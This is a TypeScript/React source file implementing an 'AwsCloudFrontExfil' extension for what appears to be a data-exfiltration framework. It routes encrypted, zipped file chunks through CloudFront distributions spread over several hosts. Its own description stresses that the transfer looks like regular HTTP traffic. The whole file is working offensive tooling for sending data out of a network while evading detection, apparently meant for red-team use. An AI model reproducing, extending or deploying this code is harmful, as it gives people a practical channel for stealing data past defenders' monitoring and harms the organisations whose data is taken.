import axios from 'axios';
import Api, {
  ApiDownloadResponse,
  ApiUploadResponse,
  ApiResponse,
  ApiConfigAwsCloudFrontExfil,
  ExtensionItem,
} from '../../../utils/Api';
import {
  BaseExfilExtension,
  ConfigFn,
  ExfilDownloadFn,
  ExfilDownloadViewProps,
  ExfilProviderCapabilities,
  ExfilUploadFn,
  ReportEvent,
} from '../Extension';
import GenericHttpDownload from '../../ui/GenericHttpDownload';
import GenericHttpUpload from '../../ui/GenericHttpUpload';
import { formatSize } from '../../../utils/Files';

export class AwsCloudFrontExfil extends BaseExfilExtension<ApiConfigAwsCloudFrontExfil> {
  public static get extension_name(): string {
    return 'awscloudfront';
  }

  public static create(
    api: Api,
    cfg: ExtensionItem<any>
  ): BaseExfilExtension<ApiConfigAwsCloudFrontExfil> {
    return new AwsCloudFrontExfil(api, cfg);
  }

  get downloadSingleView(): ExfilDownloadFn {
    throw new Error('Method not implemented.');
  }
  get uploadSingleView(): ExfilUploadFn {
    throw new Error('Method not implemented.');
  }
  get configView(): ConfigFn {
    throw new Error('Method not implemented.');
  }
  get downloadChunkedView(): ExfilDownloadFn {
    return () => <GenericHttpDownload exfil={this} mode="DownloadChunked" />;
  }
  get uploadChunkedView(): ExfilUploadFn {
    return ({ storage }: ExfilDownloadViewProps) => (
      <GenericHttpUpload exfil={this} storage={storage} mode="UploadChunked" />
    );
  }
  get description(): string {
    const desc =
      'Uses either pre-deployed or dynamically deployed CloudFront distributions to proxy uploads and downloads through. Files are zipped & encrypted before upload and decrypted & unzipped after download. Uploads and downloads use a REST interface and data is transferred in multiple blobs to different hosts. Transfer looks like regular HTTP uploads/downloads.';
    if (this.cfg.description) return desc + ' ' + this.cfg.description;
    return desc;
  }
  get capabilities(): ExfilProviderCapabilities[] {
    return ['UploadChunked', 'DownloadChunked'];
  }

  private get exfilConfig(): ApiConfigAwsCloudFrontExfil {
    return this.cfg.info! as ApiConfigAwsCloudFrontExfil;
  }

  downloadSingle(
    id: string,
    reportEvent?: ReportEvent | undefined
  ): Promise<ApiDownloadResponse> {
    throw new Error('Method not supported.');
  }

  async uploadSingle(
    storage: string,
    data: ArrayBuffer,
    reportEvent?: ReportEvent | undefined
  ): Promise<ApiUploadResponse> {
    throw new Error('Method not supported.');
  }

  async downloadChunked(
    id: string,
    reportEvent?: ReportEvent | undefined
  ): Promise<ApiDownloadResponse> {
    try {
      // Initiate download
      const initChunkedData = await this.initChunkedDownload(id);

      reportEvent &&
        reportEvent(
          'Control',
          `TransferID: ${initChunkedData.id}, Chunks: ${initChunkedData.chunks
          }, Size: ${formatSize(initChunkedData.size)}`
        );

      if (this.exfilConfig.download.mode === 'Dynamic')
        reportEvent &&
          reportEvent(
            'Control',
            'Chunked download uses dynamically deployed distributions; this might take several minutes'
          );

      // Wait for domains to become ready
      const delay = (ms: number) =>
        new Promise((resolve) => setTimeout(resolve, ms));
      var domainsReady = false;
      do {
        const info = await this.getTransferStatus(
          initChunkedData.id
        );
        domainsReady = info.status;
        if (!domainsReady) {
          await delay(10);
          reportEvent &&
            reportEvent('Info', 'Waiting for distributions to deploy...');
        }
      } while (!domainsReady);

      // Download all chunks
      reportEvent &&
        reportEvent(
          'Download',
          `Downloading ${initChunkedData.chunks} chunks...`
        );
      const chunks = await Promise.all(
        Array.from({ length: initChunkedData.chunks }, (_, key) =>
          this.downloadChunk(
            initChunkedData.hosts[key % initChunkedData.hosts.length],
            initChunkedData.id,
            key
          ).then((res) => {
            reportEvent &&
              reportEvent(
                'Download',
                `Downloaded ${formatSize(
                  res.data.byteLength
                )} from chunk #${key}.`
              );
            return res;
          })
        )
      );

      const totalLength = chunks.reduce(
        (acc, chunk) => acc + chunk.data.byteLength,
        0
      );
      const allChunks = new ArrayBuffer(totalLength);
      const allChunksView = new Uint8Array(allChunks);
      let offset = 0;

      chunks.forEach((chunk) => {
        allChunksView.set(new Uint8Array(chunk.data), offset);
        offset += chunk.data.byteLength;
      });

      // Terminate download
      await this.terminateDownload(
        initChunkedData.hosts[0],
        initChunkedData.id
      );

      reportEvent && reportEvent('Info', 'Download finished!', 'success');

      return Api.success_from_data({ data: allChunks }) as ApiDownloadResponse;
    } catch (error) {
      return Promise.reject(
        Api.fail_from_error(
          error,
          (error as any)?.response?.status === 404 ? 'ID not found' : 'Failure'
        ) as ApiDownloadResponse
      );
    }
  }

  async uploadChunked(
    storage: string,
    data: ArrayBuffer,
    reportEvent?: ReportEvent | undefined
  ): Promise<ApiUploadResponse> {
    // Initiate download
    const initChunkedData = await this.initChunkedUpload(storage, data);

    reportEvent &&
      reportEvent(
        'Control',
        `TransferID: ${initChunkedData.id}, Chunks: ${initChunkedData.chunks
        }, Size: ${formatSize(initChunkedData.size)}`
      );

    const chunksize = (this.exfilConfig.chunk_size as number) * 1024 * 1024;
    const chunks = Array.from({ length: initChunkedData.chunks }, (_, key) =>
      data.slice(key * chunksize, key * chunksize + chunksize)
    );

    if (this.exfilConfig.upload.mode === 'Dynamic')
      reportEvent &&
        reportEvent(
          'Control',
          'Chunked upload uses dynamically deployed distributions; this might take several minutes'
        );

    // Wait for domains to become ready
    const delay = (ms: number) =>
      new Promise((resolve) => setTimeout(resolve, ms));
    var domainsReady = false;
    do {
      const info = await this.getTransferStatus(
        initChunkedData.id
      );
      domainsReady = info.status;
      if (!domainsReady) {
        await delay(10000);
        reportEvent &&
          reportEvent('Info', 'Waiting for distributions to deploy...');
      }
    } while (!domainsReady);

    // Upload all chunks
    reportEvent &&
      reportEvent('Upload', `Uploading ${initChunkedData.chunks} chunks...`);

    const res = await Promise.all(
      chunks.map((chunk, i) =>
        this.uploadChunk(
          initChunkedData.hosts[i % initChunkedData.hosts.length],
          initChunkedData.id,
          i,
          chunk
        ).then((res) => {
          reportEvent &&
            reportEvent(
              'Upload',
              `Uploaded ${formatSize(chunks[i].byteLength)} for chunk #${i}.`
            );
          return res;
        })
      )
    );

    const id = res.find((r) => r.id !== undefined);
    if (!id) throw new Error('Did not receive a file ID');

    reportEvent && reportEvent('Info', 'Upload finished!', 'success');

    return id;
  }
  addHost(reportEvent: ReportEvent): Promise<string> {
    throw new Error('Method not supported.');
  }
  removeHost(host: string, reportEvent: ReportEvent): Promise<void> {
    throw new Error('Method not supported.');
  }

  static PROTO = window.location.protocol;

  async initChunkedDownload(id: string): Promise<InitChunkedResponse> {
    const cfg = this.exfilConfig;
    const baseUrl = Api.get_baseurl(cfg.download.hosts);

    try {
      const res = await axios.post(
        `/api/${this.name}/initdownload/${id}`,
        {},
        {
          headers: {
            Authorization: `Bearer ${this.api.token}`,
          },
          responseType: 'json',
          withCredentials: true,
          baseURL: baseUrl,
        }
      );

      if (!res.data)
        return Promise.reject(
          Api.fail_from_error(undefined, 'Failed to init download')
        );

      return Api.success_from_data(res.data) as InitChunkedResponse;
    } catch (error) {
      return Promise.reject(
        Api.fail_from_error(
          error,
          (error as any)?.response?.status === 404 ? 'ID not found' : 'Failure'
        ) as ApiDownloadResponse
      );
    }
  }

  async downloadChunk(
    host: string,
    transferId: string,
    chunkNo: number
  ): Promise<ApiDownloadResponse> {
    try {
      const res = await axios.get(
        `/api/${this.name}/download/${transferId}/chunk/${chunkNo}`,
        {
          headers: {
            Authorization: `Bearer ${this.api.token}`,
          },
          responseType: 'arraybuffer',
          withCredentials: true,
          baseURL: Api.get_baseurl([host])
        }
      );

      if (!res.data)
        return Promise.reject(
          Api.fail_from_error(undefined, 'Failed to download data')
        );

      return Api.success_from_data({
        data: res.data,
      }) as ApiDownloadResponse;
    } catch (error) {
      return Promise.reject(
        Api.fail_from_error(
          error,
          (error as any)?.response?.status === 404 ? 'ID not found' : 'Failure'
        ) as ApiDownloadResponse
      );
    }
  }

  async getTransferStatus(
    transferId: string
  ): Promise<TransferStatusResponse> {
    try {
      const res = await axios.get(`/api/${this.name}/status/${transferId}`, {
        headers: {
          Authorization: `Bearer ${this.api.token}`,
        },
        responseType: 'json',
        withCredentials: true,
      });

      if (!res.data)
        return Promise.reject(
          Api.fail_from_error(undefined, 'Failed to download data')
        );

      return Api.success_from_data(res.data) as TransferStatusResponse;
    } catch (error) {
      return Promise.reject(
        Api.fail_from_error(
          error,
          (error as any)?.response?.status === 404 ? 'ID not found' : 'Failure'
        ) as TransferStatusResponse
      );
    }
  }

  async terminateDownload(
    host: string,
    transferId: string
  ): Promise<ApiResponse> {
    try {
      const res = await axios.post(
        `/api/${this.name}/download/terminate/${transferId}`,
        {},
        {
          headers: {
            Authorization: `Bearer ${this.api.token}`,
          },
          responseType: 'json',
          withCredentials: true,
          baseURL: Api.get_baseurl([host]),
        }
      );

      if (res.status !== 200)
        return Promise.reject(
          Api.fail_from_error(undefined, 'Failed to terminate download')
        );

      return Api.success_from_data({}) as ApiResponse;
    } catch (error) {
      return Promise.reject(
        Api.fail_from_error(
          error,
          (error as any)?.response?.status === 404 ? 'ID not found' : 'Failure'
        ) as ApiResponse
      );
    }
  }

  async initChunkedUpload(
    storage: string,
    data: ArrayBuffer
  ): Promise<InitChunkedResponse> {
    const cfg = this.exfilConfig;
    const baseUrl = Api.get_baseurl(cfg.upload.hosts);

    try {
      const res = await axios.post(
        `/api/${this.name}/initupload/${storage}/${data.byteLength}`,
        {},
        {
          headers: {
            Authorization: `Bearer ${this.api.token}`,
          },
          responseType: 'json',
          withCredentials: true,
          baseURL: baseUrl
        }
      );

      if (!res.data)
        return Promise.reject(
          Api.fail_from_error(undefined, 'Failed to init upload')
        );

      return Api.success_from_data(res.data) as InitChunkedResponse;
    } catch (error) {
      return Promise.reject(
        Api.fail_from_error(
          error,
          (error as any)?.response?.status === 404 ? 'ID not found' : 'Failure'
        ) as ApiDownloadResponse
      );
    }
  }

  async uploadChunk(
    host: string,
    transferId: string,
    chunkNo: number,
    data: ArrayBuffer
  ): Promise<ApiUploadResponse> {
    const cfg = this.exfilConfig;

    try {
      const res = await axios.post(
        `/api/${this.name}/upload/${transferId}/chunk/${chunkNo}`,
        data,
        {
          headers: {
            'Content-Type': 'application/octet-stream',
            Authorization: `Bearer ${this.api.token}`,
          },
          maxBodyLength: Infinity,
          maxContentLength: Infinity,
          responseType: 'json',
          baseURL: Api.get_baseurl([host]),
        }
      );

      if (res.status !== 200)
        return Promise.reject(
          Api.fail_from_error(undefined, `Failed to upload chunk ${chunkNo}`)
        );

      return Api.success_from_data(res.data) as ApiUploadResponse;
    } catch (error) {
      return Promise.reject<ApiResponse>(Api.fail_from_error(error));
    }
  }
}

interface InitChunkedResponse extends ApiResponse {
  hosts: string[];
  chunks: number;
  size: number;
  id: string;
}

interface TransferStatusResponse extends ApiResponse {
  status: boolean;
}